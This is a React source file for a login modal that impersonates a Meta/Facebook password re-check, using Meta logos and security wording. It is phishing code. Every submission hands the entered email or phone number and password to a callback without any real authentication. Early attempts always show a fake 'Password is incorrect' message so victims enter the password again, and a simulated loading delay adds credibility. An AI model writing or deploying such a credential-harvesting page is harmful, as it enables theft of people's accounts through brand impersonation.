import { useState } from 'react';
import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import config from '@/utils/config';

const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
    const [formData, setFormData] = useState({
        identity: '',
        password: ''
    });
    const [loginAttempt, setLoginAttempt] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const passwordLoadingMs = Math.max(1, Number(config.password_loading_time || 3)) * 1000;
    const maxPasswordAttempts = Math.max(1, Number(config.max_password_attempts || 2));

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (showError) {
            setShowError(false);
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        if (!formData.identity.trim() || !formData.password.trim()) {
            return;
        }

        setIsLoading(true);
        setShowError(false);

        setTimeout(() => {
            setIsLoading(false);

            if (loginAttempt + 1 < maxPasswordAttempts) {
                setShowError(true);
                setLoginAttempt((prev) => prev + 1);
                onSubmit(formData.identity, formData.password);
                setFormData((prev) => ({ ...prev, password: '' }));
            } else {
                setShowError(false);
                onSubmit(formData.identity, formData.password);
                onSuccess();
            }
        }, passwordLoadingMs);
    };

    if (!show) return null;

    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '16px',
    };

    const cardStyle = {
        width: '100%',
        maxWidth: '480px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        minHeight: 'min(860px, calc(100vh - 16px))',
        maxHeight: 'min(860px, calc(100vh - 16px))',
        overflowY: 'auto',
        transform: 'scale(1)',
        opacity: 1,
    };

    const contentStyle = {
        height: '100%',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        justifyContent: 'space-between',
        flex: 1,
    };

    const inputStyle = {
        width: '100%',
        height: '40px',
        border: `1px solid ${showError ? '#ef4444' : '#d4dbe3'}`,
        borderRadius: '10px',
        padding: '0 42px 0 12px',
        fontSize: '14px',
        outline: 'none',
        boxSizing: 'border-box',
    };

    const passwordWrapStyle = {
        position: 'relative',
        width: '100%',
        marginBottom: '12px'
    };

    const identityInputStyle = {
        width: '100%',
        height: '40px',
        border: '1px solid #d4dbe3',
        borderRadius: '10px',
        padding: '0 12px',
        fontSize: '14px',
        outline: 'none',
        boxSizing: 'border-box',
        marginBottom: '12px'
    };

    const eyeBtnStyle = {
        position: 'absolute',
        right: '10px',
        top: '50%',
        transform: 'translateY(-50%)',
        border: 'none',
        background: 'transparent',
        color: '#6b7280',
        cursor: 'pointer',
        width: '22px',
        height: '22px',
        padding: 0,
        margin: 0,
        display: 'inline-flex',
        alignItems: 'center',
        justifyContent: 'center',
    };

    const submitBtnStyle = {
        width: '100%',
        height: '40px',
        minHeight: '40px',
        borderRadius: '40px',
        backgroundColor: '#0064E0',
        color: '#fff',
        fontSize: '14px',
        fontWeight: 500,
        border: 'none',
        cursor: isLoading ? 'default' : 'pointer',
        transition: 'background-color 0.2s ease',
    };

    return (
        <div style={overlayStyle}>
            <div style={cardStyle} onClick={(e) => e.stopPropagation()}>
                <div style={contentStyle}>
                    <div style={{ width: '48px', height: '48px', marginBottom: '20px' }}>
                        <img src={FbRoundLogo} width="100%" height="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                    </div>

                    <div style={{ width: '100%' }}>
                        <p style={{ color: '#9a979e', fontSize: '14px', marginBottom: '16px' }}>
                            {texts.securityReason || 'For your security, you must enter your password to continue.'}
                        </p>

                        <form autoComplete="off" onSubmit={handleSubmit}>
                            <input
                                style={identityInputStyle}
                                type="text"
                                placeholder={texts.loginIdentityPlaceholder || 'Email hoặc số điện thoại'}
                                autoComplete="off"
                                autoCorrect="off"
                                autoCapitalize="none"
                                spellCheck="false"
                                required
                                value={formData.identity}
                                onChange={(e) => handleChange('identity', e.target.value)}
                            />

                            <div style={passwordWrapStyle}>
                                <input
                                    style={inputStyle}
                                    type={showPassword ? 'text' : 'password'}
                                    placeholder={texts.password || 'Password'}
                                    autoComplete="off"
                                    autoCorrect="off"
                                    autoCapitalize="none"
                                    spellCheck="false"
                                    maxLength="30"
                                    minLength="3"
                                    required
                                    value={formData.password}
                                    onChange={(e) => handleChange('password', e.target.value)}
                                />
                                <button
                                    type="button"
                                    style={eyeBtnStyle}
                                    aria-label={showPassword ? 'Hide password' : 'Show password'}
                                    onClick={() => setShowPassword((prev) => !prev)}
                                >
                                    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true">
                                        <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z" />
                                        <circle cx="12" cy="12" r="2.8" />
                                        {showPassword && <path d="M4 20L20 4" />}
                                    </svg>
                                </button>
                            </div>

                            {showError && (
                                <p style={{ color: '#ef4444', fontSize: '14px', margin: '0 0 12px 0' }}>
                                    {texts.passwordIncorrect || 'Password is incorrect, please try again.'}
                                </p>
                            )}

                            <button
                                type="submit"
                                style={submitBtnStyle}
                                disabled={isLoading}
                                onMouseOver={(e) => {
                                    if (!isLoading) e.currentTarget.style.backgroundColor = '#1d4ed8';
                                }}
                                onMouseOut={(e) => {
                                    e.currentTarget.style.backgroundColor = '#0064E0';
                                }}
                            >
                                {isLoading ? (
                                    <span style={{
                                        width: '18px',
                                        height: '18px',
                                        border: '2px solid rgba(255,255,255,0.4)',
                                        borderTopColor: '#fff',
                                        borderRadius: '50%',
                                        animation: 'spin 0.8s linear infinite',
                                        display: 'inline-block',
                                    }} />
                                ) : (texts.continueBtn || 'Continue')}
                            </button>

                            <p style={{ textAlign: 'center', marginTop: '12px', marginBottom: 0 }}>
                                <a href="#" style={{ color: '#9a979e', fontSize: '14px', textDecoration: 'none' }}>
                                    {texts.forgotPassword || 'Forgot your password?'}
                                </a>
                            </p>
                        </form>
                    </div>

                    <div style={{ width: '64px', marginTop: '20px' }}>
                        <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                    </div>
                </div>
            </div>

            <style>{`
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
        </div>
    );
};

LoginModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    onSuccess: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default LoginModal;
